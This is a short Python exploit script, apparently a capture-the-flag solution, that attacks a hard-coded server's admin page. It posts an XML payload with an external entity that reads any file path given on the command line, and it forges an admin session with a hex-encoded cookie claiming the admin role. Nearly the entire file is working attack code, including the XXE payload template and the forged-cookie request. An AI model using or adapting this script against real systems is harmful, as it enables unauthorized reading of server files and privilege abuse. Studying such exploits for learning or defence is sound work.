import re
import requests

def extract_description(response_text):
    pattern = re.compile(r'<p>Description:(.*?)</p>', re.DOTALL)
    match = pattern.search(response_text)

    if match:
        description_content = match.group(1).strip()
        return description_content
    else:
        return "Error occured!"

def send_request(file_path):
    url = 'http://20.84.88.110:1337/admin'

    headers = {
        'Host': '20.84.88.110:1337',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://20.84.88.110:1337',
        'Connection': 'close',
        'Referer': 'http://20.84.88.110:1337/admin',
        'Cookie': 'user_info=7b22757365726e616d65223a202261646d696e222c2022656d61696c223a20227261796c6578406374662e726179222c2022726f6c655f6964223a202236323439633132632d343430662d343133342d616134382d663638636636623835376364222c2022726f6c655f6e616d65223a202261646d696e227d',
    }

    xml_data_template = '''
        <!DOCTYPE firmware [
            <!ENTITY a SYSTEM "{file}">
        ]>
        <firmware>
            <version>1.0</version>
            <description>&a;</description>
        </firmware>
    '''

    xml_data = xml_data_template.format(file=file_path)

    data = {
        'xml_data': xml_data,
    }

    response = requests.post(url, headers=headers, data=data)
    # print(response.text)

    description_content = extract_description(response.text)
    print(f"{file_path}:\n", description_content)

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python script.py <file_path>")
        sys.exit(1)

    file_path = sys.argv[1]
    send_request(file_path)
